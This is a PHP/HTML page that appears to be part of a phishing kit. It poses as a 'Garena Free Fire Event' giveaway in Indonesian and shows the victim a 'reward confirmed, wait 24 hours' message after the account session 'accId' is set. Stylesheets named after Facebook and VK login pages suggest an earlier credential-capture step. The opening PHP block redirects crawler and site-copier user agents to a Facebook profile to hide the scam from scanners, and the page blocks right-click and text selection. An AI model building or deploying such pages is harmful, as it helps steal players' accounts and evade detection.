<?php 
session_start();

$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('Location: http://www.facebook.com/IdhamDotID');
die();
}

if(!isset($_SESSION['accId'])) {
   header('location: ./');
}
?>
<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
    <meta property="og:type" content="website" />
   <meta property="og:title" content="Garena Free Fire Event" />
   <meta property="og:description" content="Dapatkan hadiah Free Fire Gratis Sekarang!" />
   <meta property="og:image" content="static/img/reward.jpg" />
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/css/bootstrap.min.css" integrity="sha384-9aIt2nRpC12Uk9gS9baDl411NQApFmC26EwAOH8WgZl5MYYxFfc+NcPb1dKGj7Sk" crossorigin="anonymous">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css" integrity="sha512-rRQtF4V2wtAvXsou4iUAs2kXHi3Lj9NE7xJR77DE7GHsxgY9RTWy93dzMXgDIG8ToiRTD45VsDNdTiUagOFeZA==" crossorigin="anonymous" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css"/>
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
    <link rel="stylesheet" href="static/css/ryu.css">
    <link rel="stylesheet" href="static/css/fb.css">
    <link rel="stylesheet" href="static/css/vk.css">
    <title>Free Fire Events</title>
  </head>
  <body oncontextmenu="return false" onselectstart="return false" ondragstart="return false">
    <div id="bg" style="filter: brightness(80%);"></div>
    <div id="app">
        <div class="ryu-header">
            <img src="https://i.ibb.co/xJf56d1/IMG-20210202-233450.jpg">
            <div class="ryu-text-header"> Free Fire <span>Event Bundle & Senjata Gratis</span></div>
        </div>
        <div class="ryu-banner">
            <div id="carouselExampleSlidesOnly" class="carousel slide" data-ride="carousel">
               <div class="carousel-inner">
                  <div class="carousel-item active">
                     <img src="https://i.ibb.co/WxwSXBc/iklan-skuyy3.jpg" class="d-block w-100" alt="...">
                  </div>
                  <div class="carousel-item">
                     <img src="https://i.ibb.co/kDp4Ghj/iklan-skuyy2.jpg" class="d-block w-100" alt="...">
                  </div>
                  <div class="carousel-item">
                     <img src="https://i.ibb.co/YZYq7M0/iklan-skuyy1.jpg" class="d-block w-100" alt="...">
                  </div>
               </div>
            </div>
        </div>
        <div class="cat">
           <div class="catBox text-left pl-2">Hallo <?= $_SESSION['accId'] ?>.<br><br> Anda berhasil mendapatkan hadiah <br> Harap menunggu proses pengiriman hadiah selama 24jam</div>
        </div>
        <form class="formInfo" action="index.php" method="POST">
            <div class="form-group mt-4 px-3">
                <button type="button" class="btn btn-primary btn-custom" style="font-size: 15px;" onclick="location.href='../';">Keluar</button>
            </div>
        </form>
    </div>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js" integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo" crossorigin="anonymous"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/js/bootstrap.min.js" integrity="sha384-OgVRvuATP1z7JjHLkuOU7Xw704+h835Lr+6QL9UvYjZE3Ipu6Tp75j7Bh/kR0JKI" crossorigin="anonymous"></script>
    <script src="static/js/ryu.js"></script>
   </body>
</html>